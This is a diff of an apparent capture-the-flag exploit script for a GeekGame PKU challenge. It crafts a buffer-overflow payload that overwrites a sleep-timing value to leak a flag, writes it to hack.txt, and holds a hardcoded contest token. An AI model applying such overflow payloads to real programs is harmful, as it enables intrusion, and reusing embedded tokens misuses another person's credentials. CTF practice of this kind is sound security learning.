@@ -1,4 +1,5 @@
 import subprocess
+import sys
 
 # 4060 --- p
 # 4160 --- usleep_time
@@ -28,16 +29,32 @@ import subprocess
 # puts output_buf                 # Leak flag
 
 token = "256:MEYCIQDRGm_v_YIBd5HzshlAQwahPR0eXiFMI_zAzZU-JLvAFQIhAO6SCgDNRpeZMHHqc6G6zi_B6IEYFis9m8q7Nq5xMV9H"
+# token = ""
 
-s = token.encode() + b'\n4\n' + b'x'*256 + \
-    b"!!!!" + \
-    b'\n49\n' + b'y' * 48 + b'\x04' + b'\n'
+if True:
+    st = b'!~'
+    us = int.from_bytes(st, byteorder='little')
+    print(us)
+    assert us <= 10e6
+    assert us > 5e6
+    s = token.encode() + b'\n\n\n4\n' + b'x'*256 + st + b'\n' + \
+        b'21\n'
 
-# print(s)
-print(s.decode())
+    print(s)
+    print(s.decode())
+
+    with open('hack.txt', 'wb') as f:
+        f.write(s)
+else:
+    s = token.encode() + b'\n\n\n4\nx\n4\n\n\n'
+    print(s)
+    print(s.decode())
+
 
 # out, err = subprocess.Popen(["nc", "prob11.geekgame.pku.edu.cn", "10011"],
 #                             stdin=subprocess.PIPE).communicate(input=s, timeout=10)
+
+# out, err = subprocess.Popen(["./race"], stdin=subprocess.PIPE).communicate(input=s, timeout=10)
 
 # print(out.decode())
 # print(err.decode())
